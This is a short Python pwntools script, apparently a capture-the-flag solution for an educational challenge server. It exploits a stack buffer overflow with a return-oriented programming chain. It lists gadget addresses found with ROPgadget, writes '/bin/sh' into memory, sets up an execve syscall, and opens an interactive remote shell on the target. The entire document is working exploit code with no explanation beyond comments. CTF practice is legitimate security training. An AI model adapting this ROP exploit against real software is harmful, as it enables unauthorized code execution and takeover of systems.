from pwn import *

context.arch = 'amd64'
r = remote('edu-ctf.zoolab.org', 10003)

# ROPgadget --multibr --binary ./chal > out
pop_rdi_ret = 0x401e3f # cat ./out | grep "pop rdi ; ret"
pop_rsi_ret = 0x409e6e # cat ./out | grep "pop rsi ; ret"
pop_rcx_ret = 0x450ed5 # cat ./out | grep "pop rcx ; ret"
mov_ptr_rdi_rcx = 0x42cc1b # cat ./out | grep "mov qword ptr \[rdi\], rcx ; ret"
# pop_rdx_ret: cat ./out | grep "pop rdx ; ret"
pop_rdx_rbx_ret = 0x47ed0b # cat ./out | grep "pop rdx ; pop rbx ; ret"
pop_rax_ret = 0x447b27 # cat ./out | grep "pop rax ; ret"
syscall_ret = 0x414506 # cat ./out | grep "syscall ; ret"

buf = 0x4c5000 + 200

ROP = flat(
    # exec('/bin/sh', 0, 0)
    pop_rdi_ret, buf,
    pop_rsi_ret, 0,
    pop_rcx_ret, b'/bin/sh\x00',
    mov_ptr_rdi_rcx,
    pop_rdx_rbx_ret, 0, 0,
    pop_rax_ret, 0x3b,
    syscall_ret,
)
r.sendlineafter(b'show me rop\n> ', b'a'*0x28 + ROP)
r.interactive()